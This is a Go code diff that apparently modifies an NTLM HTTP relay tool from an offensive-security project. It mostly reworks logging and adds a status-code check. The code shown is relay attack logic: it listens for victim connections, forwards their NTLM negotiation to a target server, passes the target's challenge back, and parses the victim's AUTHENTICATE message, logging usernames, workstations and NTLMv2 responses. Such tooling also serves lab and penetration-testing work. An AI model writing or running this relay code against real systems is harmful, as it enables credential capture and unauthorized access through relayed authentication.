@@ -29,7 +29,7 @@ func Run(target string) {
 	serverAddr := "127.0.0.1:8081"
 	TargetURL = target
 
-	logger.Printf("[+] Run server on : %s\n", serverAddr)
+	logger.Printf("[+] Run server on : http://%s\n", serverAddr)
 
 	// // Create a server to listen for requests
 	// err := http.ListenAndServe(addrServer, NTLMAuthHTTPRelay{
@@ -65,7 +65,7 @@ func Run(target string) {
 		}
 
 		relais := NTLMAuthHTTPRelay{
-			ClientConnUUID: uuid.New(),
+			ClientConnUUID: strings.Split(uuid.NewString(), "-")[0],
 			clientConn:     conn,
 			NTLMHandler: ntlm.NTLMAuth{
 				Challenge:              "00000000",
@@ -88,7 +88,7 @@ func Run(target string) {
 }
 
 type NTLMAuthHTTPRelay struct {
-	ClientConnUUID uuid.UUID
+	ClientConnUUID string
 	clientConn     net.Conn
 	NTLMHandler    ntlm.NTLMAuth
 	Target         string
@@ -116,7 +116,7 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 		clientInitiateRequest.Body.Close()
 
 		for _, line := range strings.Split(string(clientInitialRequestDump), "\n") {
-			logger.Printf("%s | client -> gop | %s\n", n.ClientConnUUID.String(), line)
+			logger.Printf("%s | client -> gop | %s\n", n.ClientConnUUID, line)
 		}
 
 		// Send WWW-Authenticate: NTLM header if not present
@@ -126,7 +126,7 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 			n.clientConn.Write(clientInitialResponseByte)
 
 			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
-				logger.Printf("%s | client <- gop | %s\n", n.ClientConnUUID.String(), line)
+				logger.Printf("%s | client <- gop | %s\n", n.ClientConnUUID, line)
 			}
 
 			continue
@@ -183,9 +183,9 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 			serverNegociateRequest := ntlm.NTLMSSP_NEGOTIATE{}
 			serverNegociateRequest.Read(authorization_bytes)
 
-			logger.Printf("%s | [+] NTLM NEGOCIATE\n", n.ClientConnUUID)
+			logger.Printf("%s | client :: gop | [+] NTLM NEGOCIATE\n", n.ClientConnUUID)
 			for _, line := range strings.Split(serverNegociateRequest.ToString(), "\n") {
-				fmt.Fprintf(logger.Writer(), "%s | %s\n", n.ClientConnUUID, line)
+				fmt.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
 			}
 
 			/*
@@ -201,7 +201,7 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 			}
 			clientNegotiateRequest.Header.Set("Connection", "keep-alive")
 
-			logger.Printf("%s | [+] Client NEGOCIATE request :\n", n.ClientConnUUID)
+			logger.Printf("%s | gop :: target | [+] Client NEGOCIATE request :\n", n.ClientConnUUID)
 			clientNegotiateRequestDump, err := httputil.DumpRequest(clientNegotiateRequest, true)
 			if err != nil {
 				return err
@@ -216,7 +216,7 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 				return err
 			}
 
-			logger.Printf("%s | [+] Client NEGOCIATE response :\n", n.ClientConnUUID)
+			logger.Printf("%s | gop :: target | [+] Client NEGOCIATE response = Target CHALLENGE:\n", n.ClientConnUUID)
 			clientNegotiateRespDump, err := httputil.DumpResponse(clientNegotiateResp, true)
 			if err != nil {
 				return err
@@ -229,6 +229,13 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 
 			authorization := clientNegotiateResp.Header.Get("Www-Authenticate")
 
+			if clientNegotiateResp.StatusCode != 401 {
+				err := fmt.Errorf("Client respond with a %s code", clientNegotiateResp.Status)
+				logger.Printf("%s |   Error       : %s\n", n.ClientConnUUID, err)
+				client.CloseIdleConnections()
+				return err
+			}
+
 			authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
 			if err != nil {
 				err := fmt.Errorf("Decode error authorization header : %s\n", authorization)
@@ -238,9 +245,9 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 			clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
 			clientChallengeNTLM.Read(authorization_bytes)
 
-			logger.Printf("%s | [+] Client Challenge\n", n.ClientConnUUID)
+			logger.Printf("%s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID)
 			for _, line := range strings.Split(clientChallengeNTLM.ToString(), "\n") {
-				fmt.Fprintf(logger.Writer(), "%s | %s\n", n.ClientConnUUID, line)
+				fmt.Fprintf(logger.Writer(), "%s | gop :: target | %s\n", n.ClientConnUUID, line)
 			}
 
 			/*
@@ -251,42 +258,49 @@ func (n NTLMAuthHTTPRelay) handleConnection() error {
 
 			// serverChallengeNTLM := ntlm.NewNTLMSSP_CHALLENGE(string(clientChallengeNTLM.Challenge), "offsec.lab")
 			// msg2b64 := base64.RawStdEncoding.EncodeToString(serverChallengeNTLM.ToBytes())
-			header := fmt.Sprintf("Www-Authenticate : NTLM %s", authorization[5:])
-			clientInitialResponseByte := []byte(fmt.Sprintf("HTTP/1.1 401 Unauthorized\n%s\nWww-Authenticate: Negotiate\nConnection: keep-alive\nContent-Length: 0\n\n\n", header))
-			// n.clientConn.Write(clientInitialResponseByte)
+			// header := fmt.Sprintf("Www-Authenticate : NTLM %s", msg2b64)
+
+			// header := fmt.Sprintf("Www-Authenticate : NTLM %s", clientChallengeNTLM.ToBytes())
+
+			// clientInitialResponseByte := []byte(fmt.Sprintf("HTTP/1.1 401 Unauthorized\n%s\nWww-Authenticate: Negotiate\nConnection: keep-alive\nContent-Length: 0\n\n\n", header))
+
 			n.clientConn.Write(clientNegotiateRespDump)
-			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
-				logger.Printf("%s | client <- gop | %s\n", n.ClientConnUUID.String(), line)
+			for _, line := range strings.Split(string(clientNegotiateRespDump), "\n") {
+				logger.Printf("%s | client <- gop | %s\n", n.ClientConnUUID, line)
 			}
 
-			logger.Printf("%s | [+] Sent server challenge to client\n", n.ClientConnUUID)
-
+			logger.Printf("%s | client :: gop | [+] Sent server challenge to client\n", n.ClientConnUUID)
 			continue
 		}
 
 		// Retrieve information into the Authentication message
 		if msgType == uint32(3) {
-			logger.Printf("%s | [+] Server received Authenticate\n", n.ClientConnUUID)
+			logger.Printf("%s | client :: gop | [+] Server received Authenticate\n", n.ClientConnUUID)
 
 			serverAuthenticate := ntlm.NTLMSSP_AUTH{}
 			serverAuthenticate.Read(authorization_bytes)
 
-			logger.Printf("%s | [+] NTLM AUTHENTICATE:\nTarget Name: %s\nUsername: %s\nWorkstation: %s\n", n.ClientConnUUID, serverAuthenticate.TargetName.RawData, serverAuthenticate.Username.RawData, serverAuthenticate.Workstation.RawData)
-			logger.Printf("%s | [+] Server authenticate\n", n.ClientConnUUID)
+			// ntlmAuthenticateInfo := fmt.Sprintf("Target Name: %s\nUsername: %s\nWorkstation: %s\n", serverAuthenticate.TargetName.RawData, serverAuthenticate.Username.RawData, serverAuthenticate.Workstation.RawData)
+			// logger.Printf("%s | client :: gop | [+] NTLM AUTHENTICATE:\n", n.ClientConnUUID)
+			// for _, line := range strings.Split(ntlmAuthenticateInfo, "\n") {
+			// 	logger.Printf("%s | client :: gop | %s\n", n.ClientConnUUID, line)
+			// }
+
+			logger.Printf("%s | client :: gop | [+] Server authenticate\n", n.ClientConnUUID)
 			for _, line := range strings.Split(serverAuthenticate.ToString(), "\n") {
-				logger.Printf("%s |  %s\n", n.ClientConnUUID, line)
+				logger.Printf("%s | client :: gop | %s\n", n.ClientConnUUID, line)
 			}
 
 			// Prepare final response to the client
 			ntlmv2Response := ntlm.NTLMv2Response{}
 			ntlmv2Response.Read(serverAuthenticate.NTLMv2Response.RawData)
 
-			fmt.Fprintf(logger.Writer(), "%s | [+] NTLM AUTHENTICATE RESPONSE:\n", n.ClientConnUUID)
+			fmt.Fprintf(logger.Writer(), "%s | client :: gop | [+] NTLM AUTHENTICATE RESPONSE:\n", n.ClientConnUUID)
 			for _, line := range strings.Split(string(ntlmv2Response.ToString()), "\n") {
-				fmt.Fprintf(logger.Writer(), "%s | %s\n", n.ClientConnUUID, line)
+				fmt.Fprintf(logger.Writer(), "%s | client :: gop | %s\n", n.ClientConnUUID, line)
 			}
 
-			logger.Printf("%s | [+] Received token : %s\n", n.ClientConnUUID, clientAuthorization)
+			// logger.Printf("%s | client :: gop | [+] Received token : %s\n", n.ClientConnUUID, clientAuthorization)
 
 			/*
 			 *
